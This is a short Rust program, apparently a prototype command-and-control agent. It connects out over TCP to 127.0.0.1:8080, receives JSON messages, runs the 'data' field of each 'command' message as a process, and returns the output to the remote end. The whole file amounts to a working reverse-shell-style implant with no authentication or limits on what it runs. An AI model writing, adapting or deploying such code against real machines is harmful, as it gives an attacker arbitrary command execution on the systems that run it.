use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde::{Deserialize, Serialize};
use serde_json::Result;


// The structs that will be serialized/deserialized as json
// as the communication protocol
#[derive(Serialize, Deserialize)]
struct MyProto {
    data: String,
    message_type: String,
    channel: String
}


#[tokio::main]
async fn main() {
    // Buff for socket
    let mut buff = [0;1024];
    // Tokio create connection
    let mut stream = TcpStream::connect("127.0.0.1:8080").await.unwrap();

    // Keep accepting data and do stuff with is
    loop{
    let n = stream.read(&mut buff).await.unwrap();
    
    // Convert JSON to struct
    let my_data: MyProto = serde_json::from_str(std::str::from_utf8( &mut buff[..n]).unwrap()).unwrap();
    //let command: Vec<&str> = my_data.command.split(" ").collect();

    // Message type is command so run the command
    if my_data.message_type == "command".to_string(){

        // Get command output
        let command_output = Command::new(my_data.data).output().await.unwrap();
        // Create object using output
        let output_data: MyProto = MyProto{
            data: std::str::from_utf8(&command_output.stdout).unwrap().to_string(),
            message_type: "command output".to_string(),
            channel: "1".to_string()
        };
        // Send it back
        stream.write(serde_json::to_string(&output_data).unwrap().as_bytes()).await.unwrap();
    }else{
        let output_data: MyProto = MyProto{
        data: "Error: Unknown message_type".to_string(),
        message_type: "Error".to_string(),
        channel: "1".to_string()}; 
        stream.write(serde_json::to_string(&output_data).unwrap().as_bytes()).await.unwrap();
    
        }
    }
}